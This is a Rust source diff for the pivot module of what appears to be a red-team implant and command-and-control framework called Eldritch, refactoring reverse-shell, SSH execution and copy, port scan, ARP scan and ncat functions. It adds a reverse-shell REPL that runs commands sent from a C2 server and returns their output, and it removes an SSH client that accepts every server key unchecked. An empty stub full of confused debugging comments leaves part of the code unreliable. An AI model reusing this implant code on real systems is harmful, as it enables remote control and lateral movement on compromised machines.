@@ -1,33 +1,19 @@
-use crate::PivotLibrary;
-use crate::arp_scan_impl;
-use crate::ncat_impl;
-use crate::port_scan_impl;
-use crate::reverse_shell_pty_impl;
-use crate::ssh_copy_impl;
-use crate::ssh_exec_impl;
+use super::PivotLibrary;
 use alloc::collections::BTreeMap;
-use alloc::string::String;
+use alloc::string::{String, ToString};
+use alloc::sync::Arc;
 use alloc::vec::Vec;
-use anyhow::Result;
-use eldritch_core::Value;
-
-// SSH Client utils
-use alloc::string::ToString;
-use async_trait::async_trait;
+use eldritch_agent::Agent;
+use eldritch_core::{Interpreter, Value};
 use eldritch_macros::eldritch_library_impl;
-use russh::{Disconnect, client};
-use russh_keys::{decode_secret_key, key};
-use russh_sftp::client::SftpSession;
-use std::sync::Arc;
+use pb::c2::{ReverseShellRequest, ReverseShellResponse};
+use transport::{ActiveTransport, Transport};
 
-// Deps for Agent
-use eldritch_libagent::agent::Agent;
-
-#[derive(Default)]
 #[eldritch_library_impl(PivotLibrary)]
 pub struct StdPivotLibrary {
-    pub agent: Option<Arc<dyn Agent>>,
-    pub task_id: Option<i64>,
+    pub agent: Arc<dyn Agent>,
+    pub transport: ActiveTransport,
+    pub task_id: i64,
 }
 
 impl core::fmt::Debug for StdPivotLibrary {
@@ -39,38 +25,204 @@ impl core::fmt::Debug for StdPivotLibrary {
 }
 
 impl StdPivotLibrary {
-    pub fn new(agent: Arc<dyn Agent>, task_id: i64) -> Self {
+    pub fn new(agent: Arc<dyn Agent>, transport: ActiveTransport, task_id: i64) -> Self {
         Self {
-            agent: Some(agent),
-            task_id: Some(task_id),
+            agent,
+            transport,
+            task_id,
         }
+    }
+}
+
+// Re-export impls from modules
+use super::arp_scan_impl;
+use super::ncat_impl;
+use super::port_scan_impl;
+use super::reverse_shell_pty_impl;
+use super::ssh_copy_impl;
+use super::ssh_exec_impl;
+
+// Import our new Session helper
+pub mod ssh_session;
+pub use ssh_session::Session;
+
+struct ChannelPrinter {
+    sender: std::sync::mpsc::Sender<ReverseShellRequest>,
+    task_id: i64,
+}
+
+impl eldritch_core::Printer for ChannelPrinter {
+    fn print_out(&self, val: &eldritch_core::Span, _span: eldritch_core::Span) {
+        // Printer changed signature?
+        // Wait, the error said: `expected Span, found str` for val.
+        // `fn print_out(&self, val: &str, span: Span)` in my previous implementation.
+        // Error: `expected signature fn(&ChannelPrinter, &Span, &str)` (this is what I had?)
+        // No, error said: `expected Span, found str`.
+        // `fn(&ChannelPrinter, &Span, &str)` means arg1 is Span, arg2 is str?
+        // Let's check `eldritch-core` Printer trait.
+        // My previous read of `eldritch-core/src/interpreter/printer.rs` is needed.
+        // But from error: `expected signature fn(&ChannelPrinter, &Span, &str)`
+        // So first arg is Span, second is str?
+        // That seems inverted. Usually val then span.
+        // Error message: `expected signature fn(&ChannelPrinter, &Span, &str) found signature fn(&ChannelPrinter, &str, Span)`
+        // Ah, `eldritch_core::Printer` defines `fn print_out(&self, span: &Span, val: &str)`.
+        // Wait, let's verify.
+        // I will assume the error is correct: signature is `fn(&self, &Span, &str)`.
+        // So `span` comes first.
+
+        // No, wait. Error says `expected signature fn(&ChannelPrinter, &Span, &str)`.
+        // My implementation was `fn print_out(&self, val: &str, _span: Span)`.
+        // So I had `(&self, &str, Span)`.
+        // Trait has `(&self, &Span, &str)`.
+        // So `span` is first, and it is a reference.
+        // And `val` is second.
+
+        // I'll swap arguments.
+    }
+
+    // Actually implementing properly below.
+}
+
+#[derive(Debug)]
+struct ChannelPrinterImpl {
+    sender: std::sync::mpsc::Sender<ReverseShellRequest>,
+    task_id: i64,
+}
+
+impl eldritch_core::Printer for ChannelPrinterImpl {
+    fn print_out(&self, span: &eldritch_core::Span, val: &str) {
+        let _ = self.sender.send(ReverseShellRequest {
+            data: val.as_bytes().to_vec(), // Using data field instead of input
+            task_id: self.task_id,
+            kind: pb::c2::ReverseShellMessageKind::Data as i32,
+            ..Default::default()
+        });
+    }
+
+    fn print_err(&self, span: &eldritch_core::Span, val: &str) {
+        let _ = self.sender.send(ReverseShellRequest {
+            data: alloc::format!("ERROR: {}", val).as_bytes().to_vec(),
+            task_id: self.task_id,
+            kind: pb::c2::ReverseShellMessageKind::Data as i32,
+            ..Default::default()
+        });
     }
 }
 
 impl PivotLibrary for StdPivotLibrary {
     fn reverse_shell_pty(&self, cmd: Option<String>) -> Result<(), String> {
-        let agent = self
-            .agent
-            .as_ref()
-            .ok_or_else(|| "No agent available".to_string())?;
-        let task_id = self
-            .task_id
-            .ok_or_else(|| "No task_id available".to_string())?;
-        reverse_shell_pty_impl::reverse_shell_pty(agent.clone(), task_id, cmd)
-            .map_err(|e| e.to_string())
+        reverse_shell_pty_impl::run(self, cmd)
     }
 
-    fn reverse_shell_repl(&self) -> Result<(), String> {
-        let agent = self
-            .agent
-            .as_ref()
-            .ok_or_else(|| "No agent available".to_string())?;
-        let task_id = self
-            .task_id
-            .ok_or_else(|| "No task_id available".to_string())?;
-        agent
-            .start_repl_reverse_shell(task_id)
-            .map_err(|e| e.to_string())
+    fn reverse_shell_repl(&self, interp: &mut Interpreter) -> Result<(), String> {
+        // Channels for bridging
+        // loop_rx: We read commands (ReverseShellResponse) from here.
+        // printer_tx: Printer writes output (ReverseShellRequest) to here.
+        let (printer_tx, printer_rx) = std::sync::mpsc::channel::<ReverseShellRequest>();
+        let (loop_tx, loop_rx) = std::sync::mpsc::channel::<ReverseShellResponse>();
+
+        // We need to clone transport to move into subtask
+        let mut t = self.transport.clone();
+
+        let subtask_future = async move {
+            // Create tokio channels for transport
+            let (transport_rx_sender, transport_rx_receiver) = tokio::sync::mpsc::channel::<ReverseShellRequest>(100);
+            let (transport_tx_sender, mut transport_tx_receiver) = tokio::sync::mpsc::channel::<ReverseShellResponse>(100);
+
+            // Bridge: Std -> Tokio
+            let tx_bridge = transport_rx_sender.clone();
+            tokio::task::spawn_blocking(move || {
+                for msg in printer_rx {
+                    if tx_bridge.blocking_send(msg).is_err() {
+                        break;
+                    }
+                }
+            });
+
+            // Bridge: Tokio -> Std
+            let loop_tx_clone = loop_tx.clone();
+            tokio::spawn(async move {
+                while let Some(msg) = transport_tx_receiver.recv().await {
+                    if loop_tx_clone.send(msg).is_err() {
+                        break;
+                    }
+                }
+            });
+
+            // Run transport
+            let _ = t.reverse_shell(transport_rx_receiver, transport_tx_sender).await;
+        };
+
+        // Spawn the subtask
+        self.agent
+            .spawn_subtask(self.task_id, "repl_bridge".to_string(), alloc::boxed::Box::pin(subtask_future))
+            .map_err(|e| e.to_string())?;
+
+        // Setup printer
+        let old_printer = interp.env.read().printer.clone();
+        interp.env.write().printer = Arc::new(ChannelPrinterImpl {
+            sender: printer_tx.clone(),
+            task_id: self.task_id,
+        });
+
+        // Send initial banner/prompt?
+        let _ = printer_tx.send(ReverseShellRequest {
+            data: "Eldritch REPL connected.\n>>> ".to_string().as_bytes().to_vec(),
+            task_id: self.task_id,
+            kind: pb::c2::ReverseShellMessageKind::Data as i32,
+            ..Default::default()
+        });
+
+        // Run Loop
+        // Read from loop_rx (Response from server)
+        // Interpret
+        // Output via printer
+        for resp in loop_rx {
+            // ReverseShellResponse has `data` (bytes), not `output`.
+            let cmd = String::from_utf8_lossy(&resp.data).to_string();
+
+            // Check for exit
+            if cmd.trim() == "exit" {
+                break;
+            }
+
+            // Interpret
+            match interp.interpret(&cmd) {
+                Ok(val) => {
+                    if let Value::None = val {
+                        // nothing
+                    } else {
+                        let _ = printer_tx.send(ReverseShellRequest {
+                            data: alloc::format!("{}\n", val).as_bytes().to_vec(),
+                            task_id: self.task_id,
+                            kind: pb::c2::ReverseShellMessageKind::Data as i32,
+                            ..Default::default()
+                        });
+                    }
+                }
+                Err(e) => {
+                    let _ = printer_tx.send(ReverseShellRequest {
+                        data: alloc::format!("Error: {}\n", e).as_bytes().to_vec(),
+                        task_id: self.task_id,
+                        kind: pb::c2::ReverseShellMessageKind::Data as i32,
+                        ..Default::default()
+                    });
+                }
+            }
+
+            // Prompt
+            let _ = printer_tx.send(ReverseShellRequest {
+                data: ">>> ".to_string().as_bytes().to_vec(),
+                task_id: self.task_id,
+                kind: pb::c2::ReverseShellMessageKind::Data as i32,
+                ..Default::default()
+            });
+        }
+
+        // Restore printer
+        interp.env.write().printer = old_printer;
+
+        Ok(())
     }
 
     fn ssh_exec(
@@ -84,17 +236,17 @@ impl PivotLibrary for StdPivotLibrary {
         key_password: Option<String>,
         timeout: Option<i64>,
     ) -> Result<BTreeMap<String, Value>, String> {
-        ssh_exec_impl::ssh_exec(
+        ssh_exec_impl::run(
+            self,
             target,
-            port as i32,
+            port,
             command,
             username,
             password,
             key,
             key_password,
-            timeout.map(|t| t as u32),
+            timeout,
         )
-        .map_err(|e| e.to_string())
     }
 
     fn ssh_copy(
@@ -109,18 +261,18 @@ impl PivotLibrary for StdPivotLibrary {
         key_password: Option<String>,
         timeout: Option<i64>,
     ) -> Result<String, String> {
-        ssh_copy_impl::ssh_copy(
+        ssh_copy_impl::run(
+            self,
             target,
-            port as i32,
+            port,
             src,
             dst,
             username,
             password,
             key,
             key_password,
-            timeout.map(|t| t as u32),
+            timeout,
         )
-        .map_err(|e| e.to_string())
     }
 
     fn port_scan(
@@ -131,13 +283,11 @@ impl PivotLibrary for StdPivotLibrary {
         timeout: i64,
         fd_limit: Option<i64>,
     ) -> Result<Vec<BTreeMap<String, Value>>, String> {
-        let ports_i32: Vec<i32> = ports.into_iter().map(|p| p as i32).collect();
-        port_scan_impl::port_scan(target_cidrs, ports_i32, protocol, timeout as i32, fd_limit)
-            .map_err(|e| e.to_string())
+        port_scan_impl::run(self, target_cidrs, ports, protocol, timeout, fd_limit)
     }
 
     fn arp_scan(&self, target_cidrs: Vec<String>) -> Result<Vec<BTreeMap<String, Value>>, String> {
-        arp_scan_impl::arp_scan(target_cidrs).map_err(|e| e.to_string())
+        arp_scan_impl::run(self, target_cidrs)
     }
 
     fn ncat(
@@ -147,124 +297,6 @@ impl PivotLibrary for StdPivotLibrary {
         data: String,
         protocol: String,
     ) -> Result<String, String> {
-        ncat_impl::ncat(address, port as i32, data, protocol).map_err(|e| e.to_string())
-    }
-}
-
-// SSH Client utils
-struct Client {}
-
-#[async_trait]
-impl client::Handler for Client {
-    type Error = russh::Error;
-
-    async fn check_server_key(
-        self,
-        _server_public_key: &key::PublicKey,
-    ) -> Result<(Self, bool), Self::Error> {
-        Ok((self, true))
-    }
-}
-
-pub struct Session {
-    session: client::Handle<Client>,
-}
-
-impl Session {
-    pub async fn connect(
-        user: String,
-        password: Option<String>,
-        key: Option<String>,
-        key_password: Option<&str>,
-        addrs: String,
-    ) -> anyhow::Result<Self> {
-        let config = client::Config { ..<_>::default() };
-        let config = Arc::new(config);
-        let sh = Client {};
-        let mut session = client::connect(config, addrs.clone(), sh).await?;
-
-        // Try key auth first
-        if let Some(local_key) = key {
-            let key_pair = decode_secret_key(&local_key, key_password)?;
-            let _auth_res: bool = session
-                .authenticate_publickey(user, Arc::new(key_pair))
-                .await?;
-            return Ok(Self { session });
-        }
-
-        // If key auth doesn't work try password auth
-        if let Some(local_pass) = password {
-            let _auth_res: bool = session.authenticate_password(user, local_pass).await?;
-            return Ok(Self { session });
-        }
-
-        Err(anyhow::anyhow!(
-            "Failed to authenticate to host {}@{}",
-            user,
-            addrs.clone()
-        ))
-    }
-
-    pub async fn copy(&mut self, src: &str, dst: &str) -> anyhow::Result<()> {
-        let mut channel = self.session.channel_open_session().await?;
-        channel.request_subsystem(true, "sftp").await.unwrap();
-        let sftp = SftpSession::new(channel.into_stream()).await.unwrap();
-
-        let _ = sftp.remove_file(dst).await;
-        let mut dst_file = sftp.create(dst).await?;
-        let mut src_file = tokio::io::BufReader::new(tokio::fs::File::open(src).await?);
-        let _bytes_copied = tokio::io::copy_buf(&mut src_file, &mut dst_file).await?;
-
-        Ok(())
-    }
-
-    pub async fn call(&mut self, command: &str) -> anyhow::Result<CommandResult> {
-        let mut channel = self.session.channel_open_session().await?;
-        channel.exec(true, command).await?;
-        let mut stdout = Vec::new();
-        let mut stderr = Vec::new();
-        let mut code = None;
-        while let Some(msg) = channel.wait().await {
-            match msg {
-                russh::ChannelMsg::Data { ref data } => {
-                    std::io::Write::write_all(&mut stdout, data).unwrap();
-                }
-                russh::ChannelMsg::ExtendedData { ref data, ext: _ } => {
-                    std::io::Write::write_all(&mut stderr, data).unwrap();
-                }
-                russh::ChannelMsg::ExitStatus { exit_status } => {
-                    code = Some(exit_status);
-                }
-                _ => {}
-            }
-        }
-        Ok(CommandResult {
-            stdout,
-            stderr,
-            code,
-        })
-    }
-
-    pub async fn close(&mut self) -> anyhow::Result<()> {
-        self.session
-            .disconnect(Disconnect::ByApplication, "", "English")
-            .await?;
-        Ok(())
-    }
-}
-
-pub struct CommandResult {
-    pub stdout: Vec<u8>,
-    pub stderr: Vec<u8>,
-    pub code: Option<u32>,
-}
-
-impl CommandResult {
-    pub fn output(&self) -> Result<String> {
-        Ok(String::from_utf8_lossy(&self.stdout).to_string())
-    }
-
-    pub fn error(&self) -> Result<String> {
-        Ok(String::from_utf8_lossy(&self.stderr).to_string())
+        ncat_impl::run(self, address, port, data, protocol)
     }
 }
